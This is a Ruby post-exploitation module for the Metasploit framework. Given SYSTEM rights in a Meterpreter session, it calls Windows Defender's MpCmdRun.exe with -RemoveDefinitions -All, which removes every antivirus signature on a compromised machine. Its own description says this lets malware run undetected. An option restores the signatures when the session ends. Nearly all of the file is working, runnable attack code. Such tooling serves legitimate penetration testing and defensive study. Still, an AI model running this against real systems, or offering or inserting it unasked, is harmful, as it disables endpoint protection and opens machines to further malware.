##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Registry

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Disable Windows Defender Signatures',
      'Description'   => %q{
        This module with appropriate rights let to use the Windows Defender command-line utility a run and automation
        tool (mpcmdrun.exe) in order to disable all the signatures available installed for the compromised machine.
        The tool is prominently used for scheduling scans and updating the signature or definition files,
        but there is a switch created to restore the installed signature definitions to a previous backup copy or
        to the original default set of signatures which is none, disabling all the signatures and allowing malware
        to execute even with the Windows Defender solution enabled.
      },
      'License'       => MSF_LICENSE,
      'Author'        => ['metasploit@[at]csiete.org',
      'luisco100 <luisco100[at]gmail.com>'], # Module author
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ],
      ))
    register_options(
      [
        OptBool.new('AUTO_CLEANUP', [ true, 'Attempt to return protections after session exit', true ])
      ])

  end
  
  def run
    #Are we system?
    if not is_system?()
      fail_with(Failure::NoAccess, "You must be System to run this Module")
    end
    #Is the binary there?
    program_path = session.sys.config.getenv('ProgramFiles')
    vprint_status("program_path = #{program_path}")
    file_path = program_path + '\Windows Defender\MpCmdRun.exe'
    vprint_status("file_path = #{file_path}")
    if not exist?(file_path)
      fail_with(Failure::NoAccess, "#{file_path} is not Present")
    end
    #Is defender even enabled?
    defender_disable_key = "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender"
    disable_key_value = meterpreter_registry_getvalinfo(defender_disable_key, "DisableAntiSpyware", REGISTRY_VIEW_NATIVE)
    if disable_key_value.nil? || disable_key_value != 1
      print_status("Removing All Definitions for Windows Defender")
      cmd = cmd_exec('cmd.exe', "/c \"#{file_path}\" -RemoveDefinitions -All")
      if cmd.include?('denied')
        print_bad("#{cmd}")
      else
        print_status("#{cmd}")
      end
    else
      fail_with(Failure::BadConfig, "Defender is not Enabled")
    end
  end

  def on_session_close(session,reason='')
    print_status("Returning Defender Signatures ")
    update_signatures
  end

  def update_signatures
    print_status("In Cleanup")
    program_path = session.sys.config.getenv('ProgramFiles')
    vprint_status("program_path = #{program_path}")
    file_path = program_path + '\Windows Defender\MpCmdRun.exe'
    cmd = cmd_exec('cmd.exe', "/c \"#{file_path}\" -SignatureUpdate")
    print_status("#{cmd}")
  end
end
0
